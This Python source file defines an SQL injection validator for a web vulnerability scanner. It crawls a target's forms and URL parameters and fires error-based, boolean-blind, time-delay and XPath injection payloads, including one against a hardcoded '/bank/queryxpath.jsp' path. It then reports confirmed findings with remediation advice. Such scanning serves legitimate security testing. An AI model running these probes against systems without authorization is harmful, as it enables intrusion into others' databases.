"""
SQLiValidator — Enhanced class-based validator for DAG/ValidationEngine pipeline.
"""
from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlsplit, parse_qsl, urlunsplit, urlencode, urljoin, urlparse

import requests
import urllib3

from zentry.session import Evidence, ValidationResult
from zentry.validators.base import BaseValidator

# Disable insecure request warning for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────────────────────
# Payload sets
# ──────────────────────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    "''",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    '" OR "1"="1',
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "' OR 'x'='x",
]

TIME_PAYLOADS = [
    "' AND SLEEP(5)-- -",
    '" AND SLEEP(5)-- -',
    "1 AND SLEEP(5)-- -",
    "'; WAITFOR DELAY '0:0:5'--",
]

BOOL_TRUE  = ["' OR '1'='1", "1 OR 1=1"]
BOOL_FALSE = ["' AND '1'='2", "1 AND 1=2"]

ERROR_PATTERNS = [
    r"sql(?:state|exception|error|syntax)",
    r"mysql_(?:fetch|num|query|error)",
    r"you have an error in your sql",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"postgresql.*error",
    r"sqlite.*error",
    r"ora-\d{5}",
    r"microsoft.*odbc",
    r"jdbc.*error",
    r"java\.sql\.",
    r"javax\.persistence",
    r"hibernateexception",
    r"syntax error",
    r"unclosed quote",
    r"unterminated string",
    r"division by zero",
    r"invalid input syntax",
    r"unknown column",
    r"no such column",
    r"no such table",
    r"table.*doesn.*exist",
    r"column.*doesn.*exist",
]

TIME_THRESHOLD = 4.0
HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; ZentryScanner/2.0)"}

HIGH_PRIORITY_PARAMS = {
    "query", "search", "q", "username", "uid", "user", "name",
    "email", "password", "id", "account", "acct", "listaccounts",
    "order", "sort", "filter", "category", "cat", "type",
    "from", "to", "date", "start", "end",
}


def _html_len(text: str) -> int:
    return len(re.sub(r"<[^>]+>", "", text))


def _is_sql_error(text: str) -> bool:
    text_lower = text.lower()
    return any(re.search(p, text_lower) for p in ERROR_PATTERNS)


def _get(url: str, cookies: dict = None, timeout: int = 15) -> tuple[float, requests.Response | None]:
    start = time.monotonic()
    try:
        r = requests.get(url, headers=HEADERS, cookies=cookies or {},
                         timeout=timeout, allow_redirects=True, verify=False)
        return time.monotonic() - start, r
    except Exception:
        return 999.0, None


def _post(url: str, data: dict, cookies: dict = None, timeout: int = 15) -> tuple[float, requests.Response | None]:
    start = time.monotonic()
    try:
        r = requests.post(url, data=data, headers=HEADERS, cookies=cookies or {},
                           timeout=timeout, allow_redirects=True, verify=False)
        return time.monotonic() - start, r
    except Exception:
        return 999.0, None


class SQLiValidator(BaseValidator):
    validator_id = "sqli_validator"
    priority = 90

    def __init__(self, context=None):
        super().__init__()
        self.context = context

    def can_run(self, state: Dict[str, Any]) -> bool:
        url = state.get("url") or state.get("target")
        return isinstance(url, str) and url.startswith(("http://", "https://"))

    def run(self, state: Dict[str, Any]) -> Optional[ValidationResult]:
        target_url = state.get("url") or state.get("target")
        if not target_url:
            return None

        # XPath / queryxpath check
        auth_manager = state.get("auth_manager")
        if auth_manager and auth_manager.authenticated:
            session = auth_manager.get_session()
            xpath_url = urljoin(target_url, "/bank/queryxpath.jsp")
            xpath_payloads = ["' or 1=1 or 'a'='a", "' or '1'='1", "'] | //user/*['", "x'] | //*['"]
            for param in ["search", "query", "user"]:
                for payload in xpath_payloads:
                    try:
                        test_url = xpath_url + f"?{param}=" + requests.utils.quote(payload)
                        r = session.get(test_url, verify=False, timeout=10)
                        if r.status_code == 200 and ("account" in r.text.lower() or "user" in r.text.lower() or "balance" in r.text.lower()):
                            return self.confirm_finding(
                                request_obj=r.request,
                                response_obj=r,
                                vulnerability="sql-injection",
                                severity="high",
                                confidence=0.98,
                                param=param,
                                payload=payload,
                                impact="XPath/SQL Injection confirmed on authenticated endpoint /bank/queryxpath.jsp.",
                                remediation="Properly escape user input in XPath expressions or use parameterized query approaches."
                            )
                    except Exception:
                        pass

        endpoints: List[str] = list(state.get("endpoints", []) or [])
        cookies: dict = state.get("auth_cookies") or {}

        forms = self._discover_forms(target_url, endpoints, cookies)

        test_targets = []
        for f in forms:
            for field in f["fields"]:
                test_targets.append({
                    "url": f["url"],
                    "param": field,
                    "method": f["method"],
                    "fields": {fd: "1" for fd in f["fields"]},
                    "type": "form"
                })

        for ep in endpoints[:30]:
            try:
                full_ep = urljoin(target_url, ep)
                parsed_ep = urlsplit(full_ep)
                params = [k for k, _ in parse_qsl(parsed_ep.query, keep_blank_values=True)]
                for p in params:
                    test_targets.append({
                        "url": full_ep,
                        "param": p,
                        "method": "GET",
                        "fields": {k: v for k, v in parse_qsl(parsed_ep.query, keep_blank_values=True)},
                        "type": "query"
                    })
            except Exception:
                pass

        seen = set()
        dedup_targets = []
        for t in test_targets:
            key = (urlparse(t["url"]).path, t["param"].lower(), t["method"])
            if key not in seen:
                seen.add(key)
                dedup_targets.append(t)

        dedup_targets = sorted(
            dedup_targets,
            key=lambda x: (0 if x["param"].lower() in HIGH_PRIORITY_PARAMS else 1, x["url"])
        )

        for t in dedup_targets[:25]:
            result = self._test_target(t, cookies)
            if result:
                return result

        return None

    def _discover_forms(self, base_url: str, endpoints: List[str], cookies: dict) -> List[Dict[str, Any]]:
        forms = []
        seen_forms = set()
        
        base_host = urlsplit(base_url).netloc
        urls_to_check = [base_url]
        for ep in endpoints:
            full = urljoin(base_url, ep)
            if urlsplit(full).netloc == base_host:
                urls_to_check.append(full)
        
        urls_to_check = list(dict.fromkeys(urls_to_check))
        
        def priority(u: str) -> int:
            u_lower = u.lower()
            if any(k in u_lower for k in ("login", "signin", "auth", "session", "search", "query", "feedback", "contact", "register", "signup")):
                return 0
            if any(u_lower.endswith(ext) for ext in (".jsp", ".php", ".aspx", ".html", ".htm")):
                return 1
            if u_lower.endswith("/"):
                return 2
            return 3
            
        urls_to_check = sorted(urls_to_check, key=priority)
        
        for url in urls_to_check[:15]:
            try:
                r = requests.get(url, headers=HEADERS, cookies=cookies, timeout=8, allow_redirects=True, verify=False)
                if r.status_code != 200:
                    continue
                body = r.text
                form_blocks = re.findall(r'<form[^>]*>.*?</form>', body, re.I | re.S)
                for block in form_blocks:
                    method_match = re.search(r'method=["\']?(post|get)["\']?', block, re.I)
                    method = method_match.group(1).upper() if method_match else "GET"
                    
                    action_match = re.search(r'action=["\']([^"\']*)["\']', block, re.I)
                    action = action_match.group(1) if action_match else ""
                    action_url = urljoin(url, action)
                    
                    fields = []
                    for input_match in re.finditer(r'<input[^>]+>', block, re.I):
                        name_match = re.search(r'name=["\']([^"\']+)["\']', input_match.group(0), re.I)
                        type_match = re.search(r'type=["\']?submit["\']?', input_match.group(0), re.I)
                        if name_match and not type_match:
                            fields.append(name_match.group(1))
                    
                    if fields:
                        form_key = (action_url, method, tuple(sorted(fields)))
                        if form_key not in seen_forms:
                            seen_forms.add(form_key)
                            forms.append({
                                "url": action_url,
                                "method": method,
                                "fields": fields
                            })
            except Exception:
                continue
        return forms

    def _test_target(self, target: Dict[str, Any], cookies: dict) -> Optional[ValidationResult]:
        url = target["url"]
        param = target["param"]
        method = target["method"]
        fields = dict(target["fields"])

        fields[param] = "1"
        if method == "POST":
            bl_time, bl_resp = _post(url, fields, cookies)
        else:
            bl_url = self._rebuild_get_url(url, fields)
            bl_time, bl_resp = _get(bl_url, cookies)
        
        bl_status = bl_resp.status_code if bl_resp else 0
        bl_body = bl_resp.text if bl_resp else ""
        bl_len = _html_len(bl_body)

        for payload in ERROR_PAYLOADS:
            test_fields = dict(fields)
            test_fields[param] = payload
            
            if method == "POST":
                t, resp = _post(url, test_fields, cookies)
            else:
                test_url = self._rebuild_get_url(url, test_fields)
                t, resp = _get(test_url, cookies)

            status = resp.status_code if resp else 0
            body = resp.text if resp else ""
            if _is_sql_error(body):
                return self.confirm_finding(
                    request_obj=resp.request if resp else None,
                    response_obj=resp,
                    vulnerability="sql-injection",
                    severity="high",
                    confidence=0.95,
                    param=param,
                    payload=payload,
                    impact=f"SQL Injection confirmed on parameter '{param}' using {method} request.",
                    remediation="Use parameterized queries (prepared statements) and ORM to filter queries. Validate and escape all input parameters.",
                )

        true_lens, false_lens = [], []
        last_true_resp = None
        
        for p in BOOL_TRUE:
            test_fields = dict(fields)
            test_fields[param] = p
            if method == "POST":
                _, resp = _post(url, test_fields, cookies)
            else:
                _, resp = _get(self._rebuild_get_url(url, test_fields), cookies)
            b = resp.text if resp else ""
            if resp:
                last_true_resp = resp
            true_lens.append(_html_len(b))

        for p in BOOL_FALSE:
            test_fields = dict(fields)
            test_fields[param] = p
            if method == "POST":
                _, resp = _post(url, test_fields, cookies)
            else:
                _, resp = _get(self._rebuild_get_url(url, test_fields), cookies)
            b = resp.text if resp else ""
            false_lens.append(_html_len(b))

        if true_lens and false_lens:
            avg_true  = sum(true_lens) / len(true_lens)
            avg_false = sum(false_lens) / len(false_lens)
            if avg_true > avg_false * 1.08 or (bl_len > avg_false * 1.08 and abs(avg_true - bl_len) / max(1, bl_len) < 0.03):
                return self.confirm_finding(
                    request_obj=last_true_resp.request if last_true_resp else None,
                    response_obj=last_true_resp,
                    vulnerability="sql-injection-boolean-blind",
                    severity="high",
                    confidence=0.85,
                    param=param,
                    payload=BOOL_TRUE[0],
                    impact=f"Boolean-based Blind SQL Injection on parameter '{param}' using {method}.",
                    remediation="Implement prepared statements and parametrized queries.",
                )

        for payload in TIME_PAYLOADS:
            test_fields = dict(fields)
            test_fields[param] = payload
            
            if method == "POST":
                t, resp = _post(url, test_fields, cookies)
            else:
                t, resp = _get(self._rebuild_get_url(url, test_fields), cookies)

            body = resp.text if resp else ""
            status = resp.status_code if resp else 0
            if t - bl_time >= TIME_THRESHOLD:
                if method == "POST":
                    t2, resp2 = _post(url, test_fields, cookies)
                else:
                    t2, resp2 = _get(self._rebuild_get_url(url, test_fields), cookies)
                
                if t2 - bl_time >= TIME_THRESHOLD:
                    return self.confirm_finding(
                        request_obj=resp2.request if resp2 else (resp.request if resp else None),
                        response_obj=resp2 if resp2 else resp,
                        vulnerability="sql-injection-time-blind",
                        severity="high",
                        confidence=0.90,
                        param=param,
                        payload=payload,
                        impact=f"Time-based Blind SQL Injection on parameter '{param}' using {method}.",
                        remediation="Apply parameterized database queries and validate parameter patterns.",
                    )

        return None

    def _rebuild_get_url(self, url: str, params: Dict[str, str]) -> str:
        parts = urlsplit(url)
        return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(params, doseq=True), parts.fragment))


class InjectionValidator(SQLiValidator):
    pass
